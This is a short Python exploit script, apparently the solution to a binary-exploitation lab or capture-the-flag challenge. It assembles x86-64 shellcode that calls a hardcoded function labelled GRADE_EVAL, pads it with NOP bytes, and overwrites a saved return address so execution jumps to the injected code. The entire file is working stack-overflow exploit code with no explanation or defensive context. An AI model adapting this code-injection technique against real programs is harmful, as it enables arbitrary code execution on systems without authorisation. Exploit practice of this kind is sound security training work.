#!/usr/bin/env python3
import struct
import sys

SHELLCODE_ADDR = 0x721000800FD0
GRADE_EVAL = 0x401A87

sc = b"\x6a\x04"
sc += b"\x5f"
sc += b"\xb8" + struct.pack("<I", GRADE_EVAL)
sc += b"\xff\xd0"

payload = sc
payload += b"\x90" * (24 - len(sc))
payload += struct.pack("<Q", SHELLCODE_ADDR)

sys.stdout.buffer.write(payload)